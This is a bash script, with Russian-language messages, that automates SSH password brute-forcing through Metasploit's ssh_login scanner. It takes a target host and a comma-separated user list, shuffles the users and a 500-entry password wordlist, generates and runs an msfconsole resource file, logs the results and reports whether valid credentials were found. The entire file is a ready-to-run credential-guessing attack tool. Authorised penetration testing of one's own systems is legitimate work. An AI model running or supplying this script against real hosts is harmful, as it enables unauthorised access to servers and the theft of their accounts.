#!/bin/bash

if [ "$#" -ne 2 ]; then
    echo "Использование: $0 <RHOSTS> <USERS>"
    echo "Пример: $0 192.168.1.50 \"root,admin,ubuntu,debian\""
    exit 1
fi

TARGET="$1"
USERS="$2"

LOG_DIR="/home/arch/Desktop/git/access_scanner/logs"
LOG_FILE="${LOG_DIR}/ssh_scan_$(date +%Y%m%d_%H%M%S).log"
ORIGINAL_PASS_FILE="/home/arch/Desktop/git/access_scanner/wordlists/500p.txt"
RC_DIR="/home/arch/Desktop/git/access_scanner/rcs"

mkdir -p "$LOG_DIR"
mkdir -p "$RC_DIR"

SHUFFLED_USER_FILE=$(mktemp /tmp/msf_users_XXXXXX.txt)
SHUFFLED_PASS_FILE=$(mktemp /tmp/msf_pass_XXXXXX.txt)
RC_FILE=$(mktemp "${RC_DIR}/msf_ssh_login_XXXXXX.rc")

cleanup() {
    echo -e "\n[+] Очистка временных файлов..."
    rm -f "$RC_FILE" "$SHUFFLED_USER_FILE" "$SHUFFLED_PASS_FILE"
    echo "[+] Готово."
}

trap cleanup EXIT

if ! command -v msfconsole &> /dev/null; then
    echo "[-] Ошибка: msfconsole не найден." | tee -a "$LOG_FILE"
    exit 1
fi

if [ ! -f "$ORIGINAL_PASS_FILE" ]; then
    echo "[-] Ошибка: файл паролей '$ORIGINAL_PASS_FILE' не найден." | tee -a "$LOG_FILE"
    exit 1
fi

echo "[+] Подготовка списка пользователей..."

# "root,admin,ubuntu,debian" -> отдельные строки
echo "$USERS" | tr ',' '\n' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' | shuf > "$SHUFFLED_USER_FILE"

echo "[+] Подготовка списка паролей..."
shuf "$ORIGINAL_PASS_FILE" > "$SHUFFLED_PASS_FILE"

cat << EOF > "$RC_FILE"
use auxiliary/scanner/ssh/ssh_login
set RHOSTS $TARGET
set USER_FILE $SHUFFLED_USER_FILE
set PASS_FILE $SHUFFLED_PASS_FILE
set THREADS 5
set VERBOSE true
run
exit
EOF

echo "[+] Запуск msfconsole для цели: $TARGET..."
echo "[+] Пользователи: $USERS"
echo "[+] Вывод дублируется в лог: $LOG_FILE"

msfconsole -q -r "$RC_FILE" 2>&1 | tee -a "$LOG_FILE"

MSF_EXIT_CODE=${PIPESTATUS[0]}

if [ "$MSF_EXIT_CODE" -ne 0 ]; then
    echo "[-] Metasploit завершился с ошибкой (Код: $MSF_EXIT_CODE)." | tee -a "$LOG_FILE"
    exit "$MSF_EXIT_CODE"
fi

if grep -q "Success" "$LOG_FILE" || grep -q "SSH session" "$LOG_FILE"; then
    echo "[+] Сканирование завершено. Найдены валидные учётные данные!" | tee -a "$LOG_FILE"
else
    echo "[+] Сканирование завершено. Успешных совпадений не найдено." | tee -a "$LOG_FILE"
fi
